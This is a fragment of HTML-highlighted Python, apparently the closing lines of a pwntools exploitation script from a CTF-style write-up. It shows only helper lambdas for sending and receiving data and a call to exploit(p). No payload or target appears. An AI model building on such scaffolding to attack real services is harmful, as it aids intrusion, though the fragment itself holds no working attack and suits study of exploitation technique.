    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>
:ET